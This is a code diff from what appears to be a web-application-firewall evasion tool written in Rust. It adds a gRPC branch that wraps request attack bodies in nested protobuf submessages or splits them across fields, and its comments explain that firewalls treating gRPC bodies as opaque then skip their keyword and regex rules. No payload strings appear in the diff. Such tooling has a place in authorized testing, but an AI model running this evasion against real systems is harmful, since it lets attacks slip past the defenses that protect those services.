@@ -17,6 +17,7 @@ use wafrift_encoding::header;
 use wafrift_evolution::advisor::EvasionPlan;
 use wafrift_fingerprint::fingerprint;
 use wafrift_grammar::grammar;
+use wafrift_grpc_evasion;
 use wafrift_smuggling::h2_evasion;
 use wafrift_smuggling::smuggling;
 use wafrift_types::{EvasionResult, Request, Technique};
@@ -858,6 +859,12 @@ fn apply_header_obfuscation(
 }
 
 /// Apply Content-Type switching from the raw body.
+///
+/// When the request already carries `Content-Type: application/grpc`, we
+/// add gRPC-evasion encoded variants (nested submessage, split-field) to
+/// the candidate set instead of plain content-type variants. WAFs that treat
+/// `application/grpc` bodies as opaque binary skip all keyword/regex rules;
+/// the origin's protobuf parser decodes the string fields back to plaintext.
 fn apply_content_type_switch(
     req: &mut Request,
     techniques: &mut Vec<Technique>,
@@ -869,6 +876,38 @@ fn apply_content_type_switch(
     }
     let Some(ref body) = req.body else { return };
 
+    // ── gRPC routing arm ────────────────────────────────────────────────
+    // When the request targets a gRPC endpoint, pick the first untried
+    // gRPC-evasion variant (nested > split > flat) and apply it.
+    if is_grpc_request(req) {
+        let body_str = String::from_utf8_lossy(body).into_owned();
+        let tried_nested = state.tried_content_types.contains("grpc:nested-5");
+        let tried_split = state.tried_content_types.contains("grpc:split-10");
+
+        let (variant_body, variant_tag) = if !tried_nested {
+            (
+                wafrift_grpc_evasion::embed_attack_in_nested(&body_str, 5),
+                "grpc:nested-5",
+            )
+        } else if !tried_split {
+            (
+                wafrift_grpc_evasion::split_attack_across_fields(&body_str, 10),
+                "grpc:split-10",
+            )
+        } else {
+            (
+                wafrift_grpc_evasion::embed_attack_in_message(&body_str),
+                "grpc:flat",
+            )
+        };
+
+        req.body = Some(variant_body);
+        // Content-Type stays application/grpc — the WAF must not see a switch.
+        techniques.push(Technique::ContentTypeSwitch(variant_tag.to_string()));
+        return;
+    }
+
+    // ── Standard content-type switching for non-gRPC requests ───────────
     let variants = content_type::generate_variants_from_body(body);
     if let Some(variant) = variants
         .into_iter()
